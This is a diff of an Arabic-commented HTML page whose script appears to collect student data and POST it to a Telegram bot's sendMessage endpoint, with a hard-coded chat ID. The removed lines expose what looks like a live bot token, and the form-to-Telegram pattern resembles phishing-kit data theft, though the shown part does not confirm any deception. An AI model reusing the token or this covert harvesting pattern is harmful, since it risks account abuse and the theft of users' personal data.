@@ -771,7 +771,7 @@
                         stroke-linejoin="round" />
                     <circle cx="50" cy="45" r="14" />
                 </svg>
-                <!-- ترس 2 صغير يدور عكس عقارب الساعة ومتداخل -->
+                <!-- ترس 2 صغير متداخل يدور عكس عقارب الساعة -->
                 <svg class="gear gear-2 gear-primary" viewBox="0 0 100 100">
                     <path
                         d="M46,2 L54,2 L55,10 C58,11 61,13 63.6,15.2 L71,11.8 L76.6,17.4 L73.2,24.8 C75.4,27.4 77,30.4 78,33.4 L86,34.4 L86,42.4 L80,45.4 C80,48.6 79.4,51.6 78.4,54.4 L83.8,60.8 L78.2,66.4 L70.8,63 C68.2,65.2 65.2,66.8 62.2,67.8 L61.2,75.8 L53.2,75.8 L50.2,69.8 C47,69.8 44,69.2 41.2,68.2 L34.8,73.6 L29.2,68 L32.6,60.6 C30.4,58 28.8,55 27.8,52 L19.8,51 L19.8,43 L25.8,40 C25.8,36.8 26.4,33.8 27.4,31 L22,24.6 L27.6,19 L35,22.4 C37.6,20.2 40.6,18.6 43.6,17.6 Z"
@@ -887,9 +887,9 @@
     </section>
 
     <script>
-        // إعدادات الروابط الرسمية للـ Telegram Bot API
-        const TG_SEND_URL = "https://telegram.org/bot8757174068:AAEdk_fNRchcGTm47kpro49FEzOVXSGVX3k/sendMessage";
-        const TG_UPDATES_URL = "https://telegram.org/bot8757174068:AAEdk_fNRchcGTm47kpro49FEzOVXSGVX3k/getUpdates";
+        // إعدادات الربط المباشر مع تلغرام
+        const TG_SEND_URL = "https://telegram.org";
+        const TG_UPDATES_URL = "https://telegram.org";
         const TARGET_CHAT_ID = "8717720399";
 
         // كائن تخزين بيانات الطالب
@@ -991,7 +991,7 @@
             // الانتقال الفوري للشاشة الرابعة
             switchScreen('screen-pending');
 
-            // إرسال طلب fetch POST إلى رابط sendMessage
+            // إرسال طلب fetch POST إلى رابط sendMessage المباشر
             try {
                 await fetch(TG_SEND_URL, {
                     method: 'POST',
